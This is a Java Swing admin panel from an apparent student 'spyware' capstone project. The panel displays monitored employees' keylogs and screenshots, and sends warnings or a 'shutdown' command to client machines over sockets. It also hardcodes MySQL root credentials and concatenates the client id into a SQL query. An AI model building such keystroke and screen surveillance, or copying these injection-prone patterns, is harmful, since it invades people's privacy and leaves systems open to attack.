/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package spy.admin;

import database.Database;
import java.awt.Image;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import javax.swing.table.DefaultTableModel;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.SQLException;
import java.util.List;
import javax.swing.ImageIcon;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;
/**
 *
 * @author root
 */
public class ClientDetails extends javax.swing.JPanel {
    String id="";
    
    Database db;
    List<Socket> clientSockets;
    /**
     * Creates new form StudentDetails
     * @param id
     */
    public ClientDetails(String id,List clientSockets) {
        this.id=id;
        this.clientSockets=clientSockets;
        
        try {
            db = new Database();
        } catch (SQLException ex) {
            Logger.getLogger(ClientDetails.class.getName()).log(Level.SEVERE, null, ex);
        }
        initComponents();
        showImage(pos);
        showalert();
    }
   
    int pos=0;
    
    public String[] getImages()
    {
     
        try{
       File directoryPath = new File("C:/Users/Hp/OneDrive/Documents/capstoneproject/spy-admin/src/images/screenshots/"+id);
        String contents[] = directoryPath.list();
//       for(int i=0; i<contents.length; i++) {
//           System.out.println(contents[i]);
//        }
//        
        
        return contents;
        
        }catch(Exception e){
            return null;
        }
    }
    
    public void showalert(){
        int res = db.CheckClientAlert(id);
       System.out.println("0");
        if(res > 0){
            System.out.println(res);
            ResultSet rs= db.getClientDetails(id);
            System.out.println("1");
        
            try {
               
                    System.out.println("2");
                if(rs.next())
                {
                    System.out.println("3");
                    String alert=rs.getString("alert_msg");
                    if(!alert.equals(""))
                    {
                    JOptionPane.showMessageDialog(null,alert,"Alert",JOptionPane.INFORMATION_MESSAGE);
                    }
                    
                }
                
            } catch (Exception ex) {
                Logger.getLogger(ClientDetails.class.getName()).log(Level.SEVERE, null, ex);
            }
           
        }
    }
    
    
     public void showImage(int index)
    {
        try{
        String[] imagesList = getImages();
        if(imagesList!=null){
            String imageName = imagesList[index];
            ImageIcon icon = new ImageIcon("C:/Users/Hp/OneDrive/Documents/capstoneproject/spy-admin/src/images/screenshots/"+id+"/"+imageName);
            System.out.println("width");
            System.out.println(jLabel_Image.getWidth());
            Image image = icon.getImage().getScaledInstance(506, 330, Image.SCALE_SMOOTH);
           jLabel_Image.setIcon(new ImageIcon(image));
           }
        }
        catch(Exception e)
        {
           
        }
    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jPanel1 = new javax.swing.JPanel();
        jLabel1 = new javax.swing.JLabel();
        jScrollPane1 = new javax.swing.JScrollPane();
        String[] columnNames = {"Key", "Value"};
        jTable1 = new javax.swing.JTable();
        jLabel2 = new javax.swing.JLabel();
        jPanel2 = new javax.swing.JPanel();
        jLabel_Image = new javax.swing.JLabel();
        jButton_first = new javax.swing.JButton();
        jButton_last = new javax.swing.JButton();
        jButton_next = new javax.swing.JButton();
        jButton_previous = new javax.swing.JButton();
        jLabel3 = new javax.swing.JLabel();
        jPanel3 = new javax.swing.JPanel();
        jScrollPane2 = new javax.swing.JScrollPane();
        jTextArea1 = new javax.swing.JTextArea();
        alertmsg = new javax.swing.JTextField();
        submitAlert = new javax.swing.JButton();
        jButton1 = new javax.swing.JButton();

        setLayout(new java.awt.CardLayout());

        jPanel1.setBackground(new java.awt.Color(169, 182, 227));
        jPanel1.setPreferredSize(new java.awt.Dimension(820, 663));

        jLabel1.setFont(new java.awt.Font("Ubuntu", 1, 20)); // NOI18N
        jLabel1.setForeground(new java.awt.Color(255, 255, 255));
        jLabel1.setText("Client Keylog:");

        DefaultTableModel model=new javax.swing.table.DefaultTableModel();
        model.setColumnIdentifiers(columnNames);
        jTable1.setModel(model);
        jTable1.getTableHeader().setReorderingAllowed(false);
        jScrollPane1.setViewportView(jTable1);
        Connection con = null;
        PreparedStatement pst;
        ResultSet rs;
        try{

            //MAKE SURE YOU KEEP THE mysql_connector.jar file in java/lib folder
            //ALSO SET THE CLASSPATH

            Class.forName("com.mysql.jdbc.Driver");
            con=DriverManager.getConnection("jdbc:mysql://localhost:3306/spyware","root","raut123");
            System.out.println("connetion success.....");

        }
        catch (ClassNotFoundException e)
        {
            System.out.println("exception : "+e);
        } catch (SQLException ex) {
        }

        try {
            pst=con.prepareStatement("select * from client_logs where empid='"+id+"' order by id desc limit 1");

            rs=pst.executeQuery();

            while(rs.next())
            {
                String name=rs.getString("name");
                model.addRow(new Object[]{"Name",name});
                String pcno=rs.getString("pcno");
                model.addRow(new Object[]{"PC Number",pcno});
                String empid=rs.getString("empid");
                model.addRow(new Object[]{"EMP Id",empid});
                String department=rs.getString("department");
                model.addRow(new Object[]{"Department",department});
                String login_datetime=rs.getString("login_datetime");
                model.addRow(new Object[]{"Login datetime",login_datetime});
                String logout_datetime=rs.getString("logout_datetime");
                if(logout_datetime==null){
                    logout_datetime="";
                }
                model.addRow(new Object[]{"Logout Datetime",logout_datetime});

            }

        } catch (Exception e) {
            // TODO Auto-generated catch block
            System.out.println("error while validating"+e);

        }

        jLabel2.setFont(new java.awt.Font("Ubuntu", 1, 20)); // NOI18N
        jLabel2.setForeground(new java.awt.Color(255, 255, 255));
        jLabel2.setText("Screenshots:");

        jLabel_Image.setPreferredSize(new java.awt.Dimension(495, 495));

        jButton_first.setText("First");
        jButton_first.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton_firstActionPerformed(evt);
            }
        });

        jButton_last.setText("Last");
        jButton_last.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton_lastActionPerformed(evt);
            }
        });

        jButton_next.setText("Next");
        jButton_next.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton_nextActionPerformed(evt);
            }
        });

        jButton_previous.setText("Previous");
        jButton_previous.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton_previousActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout jPanel2Layout = new javax.swing.GroupLayout(jPanel2);
        jPanel2.setLayout(jPanel2Layout);
        jPanel2Layout.setHorizontalGroup(
            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel2Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jLabel_Image, javax.swing.GroupLayout.PREFERRED_SIZE, 506, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 44, Short.MAX_VALUE)
                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                        .addComponent(jButton_next, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(jButton_previous, javax.swing.GroupLayout.DEFAULT_SIZE, 93, Short.MAX_VALUE)
                        .addComponent(jButton_last, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                    .addComponent(jButton_first, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.PREFERRED_SIZE, 93, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(65, 65, 65))
        );
        jPanel2Layout.setVerticalGroup(
            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel2Layout.createSequentialGroup()
                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel2Layout.createSequentialGroup()
                        .addGap(40, 40, 40)
                        .addComponent(jButton_first, javax.swing.GroupLayout.PREFERRED_SIZE, 46, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(18, 18, 18)
                        .addComponent(jButton_next, javax.swing.GroupLayout.PREFERRED_SIZE, 46, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(18, 18, 18)
                        .addComponent(jButton_previous, javax.swing.GroupLayout.PREFERRED_SIZE, 51, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(18, 18, 18)
                        .addComponent(jButton_last, javax.swing.GroupLayout.PREFERRED_SIZE, 50, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addGroup(jPanel2Layout.createSequentialGroup()
                        .addContainerGap()
                        .addComponent(jLabel_Image, javax.swing.GroupLayout.PREFERRED_SIZE, 331, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        jLabel3.setFont(new java.awt.Font("Ubuntu", 1, 20)); // NOI18N
        jLabel3.setForeground(new java.awt.Color(255, 255, 255));
        jLabel3.setText("Client Details:");

        jTextArea1.setColumns(20);
        jTextArea1.setRows(5);
        try
        {
            File file=new File("C:/Users/Hp/OneDrive/Documents/capstoneproject/spy-admin/src/logs/"+id+"/keylog.txt");    //creates a new file instance
            FileReader fr=new FileReader(file);   //reads the file
            BufferedReader br=new BufferedReader(fr);  //creates a buffering character input stream
            StringBuffer sb=new StringBuffer();    //constructs a string buffer with no characters
            String line;
            while((line=br.readLine())!=null)
            {
                sb.append(line);      //appends line to string buffer
                sb.append("\n");     //line feed
                //jTextArea1.append(line+"\n");
                //jTextArea1.append("\n");
            }
            fr.close();    //closes the stream and release the resources
            System.out.println("Contents of File: ");
            //System.out.println(sb.toString());   //returns a string that textually represents the object
            jTextArea1.setText(sb.toString());
        }
        catch(IOException e)
        {
            e.printStackTrace();
        }
        jScrollPane2.setViewportView(jTextArea1);

        javax.swing.GroupLayout jPanel3Layout = new javax.swing.GroupLayout(jPanel3);
        jPanel3.setLayout(jPanel3Layout);
        jPanel3Layout.setHorizontalGroup(
            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane2, javax.swing.GroupLayout.DEFAULT_SIZE, 353, Short.MAX_VALUE)
        );
        jPanel3Layout.setVerticalGroup(
            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane2)
        );

        submitAlert.setText("Send Warning ");
        submitAlert.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                submitAlertActionPerformed(evt);
            }
        });

        jButton1.setText("Shutdown client ");
        jButton1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton1ActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);
        jPanel1.setLayout(jPanel1Layout);
        jPanel1Layout.setHorizontalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel1Layout.createSequentialGroup()
                        .addComponent(jLabel3)
                        .addGap(309, 309, 309)
                        .addComponent(jLabel1)
                        .addGap(224, 224, 224))
                    .addComponent(jPanel2, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                        .addGroup(javax.swing.GroupLayout.Alignment.LEADING, jPanel1Layout.createSequentialGroup()
                            .addComponent(jLabel2)
                            .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                            .addComponent(alertmsg, javax.swing.GroupLayout.PREFERRED_SIZE, 293, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addGap(18, 18, 18)
                            .addComponent(submitAlert, javax.swing.GroupLayout.PREFERRED_SIZE, 112, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                            .addComponent(jButton1))
                        .addGroup(javax.swing.GroupLayout.Alignment.LEADING, jPanel1Layout.createSequentialGroup()
                            .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 341, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addGap(18, 18, 18)
                            .addComponent(jPanel3, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );
        jPanel1Layout.setVerticalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel1)
                    .addComponent(jLabel3))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addComponent(jPanel3, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 203, Short.MAX_VALUE))
                .addGap(18, 18, 18)
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel2)
                    .addComponent(alertmsg, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(submitAlert)
                    .addComponent(jButton1))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jPanel2, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addContainerGap())
        );

        add(jPanel1, "card2");
    }// </editor-fold>//GEN-END:initComponents

    private void jButton_firstActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton_firstActionPerformed
        // TODO add your handling code here:
        showImage(0);
    }//GEN-LAST:event_jButton_firstActionPerformed

    private void jButton_nextActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton_nextActionPerformed
        // TODO add your handling code here:
        pos=pos + 1;
        if(pos >= getImages().length){
            pos=getImages().length - 1;
        }
        showImage(pos);
    }//GEN-LAST:event_jButton_nextActionPerformed

    private void jButton_previousActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton_previousActionPerformed
        // TODO add your handling code here:
        pos=pos - 1;
        if(pos < 0){
            pos=0;
        }
        showImage(pos);
    }//GEN-LAST:event_jButton_previousActionPerformed

    private void jButton_lastActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton_lastActionPerformed
        // TODO add your handling code here:
        pos=getImages().length - 1;
        showImage(pos);
    }//GEN-LAST:event_jButton_lastActionPerformed

    private void submitAlertActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_submitAlertActionPerformed

        String msg=alertmsg.getText();
        if(msg.equals(""))
        {
        JOptionPane.showMessageDialog(null,"Please enter the warning ","Alert",JOptionPane.INFORMATION_MESSAGE);
        }
        else
        {
        boolean n= db.updateAlertMsg(id,msg);
        
        if (n)
        {
        JOptionPane.showMessageDialog(null,"Message save Successfully ","Alert",JOptionPane.INFORMATION_MESSAGE);
        }
        for (Socket clientSocket : clientSockets) {
            try {
                PrintWriter out = new PrintWriter(new OutputStreamWriter(clientSocket.getOutputStream()), true);
                out.println(alertmsg.getText());
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
        
        }
   
    }//GEN-LAST:event_submitAlertActionPerformed

    private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton1ActionPerformed

        for (Socket clientSocket : clientSockets) {
            try {
                PrintWriter out = new PrintWriter(new OutputStreamWriter(clientSocket.getOutputStream()), true);
                out.println("shutdown");
                clientSocket.close();
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
        clientSockets.clear();
        
    }//GEN-LAST:event_jButton1ActionPerformed


    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JTextField alertmsg;
    private javax.swing.JButton jButton1;
    private javax.swing.JButton jButton_first;
    private javax.swing.JButton jButton_last;
    private javax.swing.JButton jButton_next;
    private javax.swing.JButton jButton_previous;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JLabel jLabel3;
    private javax.swing.JLabel jLabel_Image;
    private javax.swing.JPanel jPanel1;
    private javax.swing.JPanel jPanel2;
    private javax.swing.JPanel jPanel3;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JScrollPane jScrollPane2;
    private javax.swing.JTable jTable1;
    private javax.swing.JTextArea jTextArea1;
    private javax.swing.JButton submitAlert;
    // End of variables declaration//GEN-END:variables
}
